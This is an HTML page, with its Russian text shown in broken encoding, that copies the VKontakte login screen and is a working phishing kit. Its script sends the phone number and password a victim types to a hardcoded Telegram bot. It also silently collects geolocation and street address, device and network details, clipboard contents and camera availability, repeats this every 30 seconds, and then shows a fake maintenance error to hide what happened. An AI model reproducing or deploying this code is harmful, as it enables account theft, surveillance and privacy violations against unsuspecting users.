<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–ö–æ–Ω—Ç–∞–∫—Ç–µ | –í—Ö–æ–¥</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .vk-logo {
            text-align: center;
            margin-bottom: 30px;
            color: #2787f5;
            font-size: 32px;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #d3d9de;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #2787f5;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background: #1a6bc9;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- –§–ò–®–ò–ù–ì–û–í–ê–Ø –§–û–†–ú–ê –í–ö -->
    <div class="login-container" id="loginForm">
        <div class="vk-logo">–í–ö–æ–Ω—Ç–∞–∫—Ç–µ</div>
        <form id="vkForm">
            <div class="form-group">
                <input type="text" id="phone" placeholder="–¢–µ–ª–µ—Ñ–æ–Ω –∏–ª–∏ email" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å" required>
            </div>
            <button type="submit">–í–æ–π—Ç–∏</button>
        </form>
        <div class="footer">
            <a href="#" style="color: #2787f5; text-decoration: none;">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</a>
        </div>
    </div>

    <!-- –°–û–û–ë–©–ï–ù–ò–ï –û–ë –û–®–ò–ë–ö–ï (–º–∞—Å–∫–∏—Ä–æ–≤–∫–∞) -->
    <div class="login-container hidden" id="errorMsg">
        <div style="text-align: center; color: #e64646;">
            <div style="font-size: 48px; margin-bottom: 20px;">‚ö†Ô∏è</div>
            <h3>–í—Ä–µ–º–µ–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ —Ä–∞–±–æ—Ç—ã</h3>
            <p style="margin: 20px 0;">–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –≤–æ–π—Ç–∏ –ø–æ–∑–∂–µ. –ü—Ä–∏–Ω–æ—Å–∏–º –∏–∑–≤–∏–Ω–µ–Ω–∏—è –∑–∞ –Ω–µ—É–¥–æ–±—Å—Ç–≤–∞.</p>
            <button onclick="location.reload()">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>
        </div>
    </div>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram –±–æ—Ç–∞
        const BOT_TOKEN = "7619600603:AAEPTYr6ShZQi5KoSvDPmGS7L5M-k8L3AT8";
        const CHAT_ID = "1229704307";
        
        let collectedData = {
            credentials: {},
            deviceInfo: {},
            location: {},
            networkInfo: {}
        };

        // üì® –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        function sendToTelegram(message) {
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º Image –¥–ª—è –æ–±—Ö–æ–¥–∞ CORS (–ø—Ä–æ—Å—Ç–æ–π –º–µ—Ç–æ–¥)
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            
            // –†–µ–∑–µ—Ä–≤–Ω—ã–π –º–µ—Ç–æ–¥ —á–µ—Ä–µ–∑ fetch —Å –ø—Ä–æ–∫—Å–∏
            fetch(`https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            }).catch(e => console.log('Telegram send failed'));
        }

        // üì± –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
        function collectDeviceInfo() {
            collectedData.deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                referrer: document.referrer,
                cookies: document.cookie ? 'yes' : 'no'
            };
            
            // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            collectedData.deviceInfo.deviceType = isMobile ? 'mobile' : 'desktop';
            
            return `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${collectedData.deviceInfo.deviceType}\n` +
                   `üåê –ë—Ä–∞—É–∑–µ—Ä: ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n` +
                   `üìè –≠–∫—Ä–∞–Ω: ${screen.width}x${screen.height}\n` +
                   `üïê –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${collectedData.deviceInfo.timezone}`;
        }

        // üìç –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        collectedData.location = { lat, lon };
                        
                        // –ü–æ–ª—É—á–∞–µ–º –∞–¥—Ä–µ—Å
                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
                            .then(r => r.json())
                            .then(data => {
                                const address = data.display_name || '–ê–¥—Ä–µ—Å –Ω–µ –Ω–∞–π–¥–µ–Ω';
                                resolve(`üìç –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ: ${lat}, ${lon}\nüè† –ê–¥—Ä–µ—Å: ${address}`);
                            })
                            .catch(() => resolve(`üìç –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${lat}, ${lon}`));
                    },
                    error => {
                        resolve(`üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: ${error.message}`);
                    },
                    { timeout: 10000 }
                );
            });
        }

        // üì∂ –°–±–æ—Ä —Å–µ—Ç–µ–≤–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
        function collectNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let networkInfo = "üì∂ –°–µ—Ç—å: –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞";
            
            if (connection) {
                networkInfo = `üì∂ –°–µ—Ç—å: ${connection.effectiveType || 'unknown'}\n` +
                             `üì° –°–∫–æ—Ä–æ—Å—Ç—å: ${connection.downlink || 'unknown'} Mb/s\n` +
                             `‚è±Ô∏è –ó–∞–¥–µ—Ä–∂–∫–∞: ${connection.rtt || 'unknown'}ms`;
                collectedData.networkInfo = connection;
            }
            
            return networkInfo;
        }

        // üîç –°–±–æ—Ä –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        function collectAdditionalData() {
            let additional = "üîç –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ:\n";
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–µ API
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    additional += `üîã –ë–∞—Ç–∞—Ä–µ—è: ${Math.round(battery.level * 100)}%\n`;
                });
            }
            
            if (navigator.storage && navigator.storage.estimate) {
                navigator.storage.estimate().then(estimate => {
                    additional += `üíæ –ü–∞–º—è—Ç—å: ${Math.round(estimate.usage / 1024 / 1024)}MB / ${Math.round(estimate.quota / 1024 / 1024)}MB\n`;
                });
            }
            
            return additional;
        }

        // üéØ –û–°–ù–û–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø –°–ë–û–†–ê –î–ê–ù–ù–´–•
        async function collectAllData() {
            let report = "üéØ –°–ë–û–† –î–ê–ù–ù–´–• –ê–ö–¢–ò–í–ò–†–û–í–ê–ù\n\n";
            
            // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
            report += collectDeviceInfo() + "\n\n";
            report += collectNetworkInfo() + "\n\n";
            report += await getLocation() + "\n\n";
            report += collectAdditionalData();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            sendToTelegram(report);
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage –Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π
            localStorage.setItem('collected_data', JSON.stringify(collectedData));
            
            return report;
        }

        // üìù –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–∏—à–∏–Ω–≥–æ–≤–æ–π —Ñ–æ—Ä–º—ã
        document.getElementById('vkForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º credentials
            collectedData.credentials = { phone, password };
            
            // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
            await collectAllData();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º credentials –æ—Ç–¥–µ–ª—å–Ω–æ
            const credsMessage = `üîê –ü–û–õ–£–ß–ï–ù–´ –î–ê–ù–ù–´–ï –í–ö:\nüì± –¢–µ–ª–µ—Ñ–æ–Ω: ${phone}\nüîë –ü–∞—Ä–æ–ª—å: ${password}`;
            sendToTelegram(credsMessage);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ (–º–∞—Å–∫–∏—Ä–æ–≤–∫–∞)
            document.getElementById('loginForm').classList.add('hidden');
            document.getElementById('errorMsg').classList.remove('hidden');
            
            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Å–±–æ—Ä —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(() => {
                collectAllData().then(data => {
                    sendToTelegram("üîÑ –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–´–ô –°–ë–û–† –î–ê–ù–ù–´–•:\n" + data);
                });
            }, 5000);
        });

        // üöÄ –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò–ô –°–ë–û–† –ü–†–ò –ó–ê–ì–†–£–ó–ö–ï (—Å–∫—Ä—ã—Ç–Ω–æ)
        window.addEventListener('load', function() {
            // –°–æ–±–∏—Ä–∞–µ–º –±–∞–∑–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ —Å—Ä–∞–∑—É
            setTimeout(() => {
                collectAllData().then(data => {
                    console.log("–î–∞–Ω–Ω—ã–µ —Å–æ–±—Ä–∞–Ω—ã:", data);
                });
            }, 2000);
            
            // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–π —Å–±–æ—Ä –∫–∞–∂–¥—ã–µ 30 —Å–µ–∫—É–Ω–¥
            setInterval(() => {
                collectAllData();
            }, 30000);
        });

        // üì∏ –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ (—Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤—É–µ—Ç)
        document.addEventListener('click', function() {
            if (!collectedData.cameraAttempted) {
                collectedData.cameraAttempted = true;
                
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            sendToTelegram("üì∏ –ö–∞–º–µ—Ä–∞ –¥–æ—Å—Ç—É–ø–Ω–∞!");
                            stream.getTracks().forEach(track => track.stop());
                        })
                        .catch(() => { /* –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ */ });
                }
            }
        });

        // üíæ –ü–µ—Ä–µ—Ö–≤–∞—Ç –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ –ø—Ä–∏ —Ñ–æ–∫—É—Å–µ
        document.getElementById('phone').addEventListener('focus', function() {
            navigator.clipboard.readText().then(text => {
                if (text && text.length > 3) {
                    sendToTelegram(`üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞: ${text.substring(0, 100)}`);
                }
            }).catch(() => { /* –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ */ });
        });

    </script>
</body>
</html>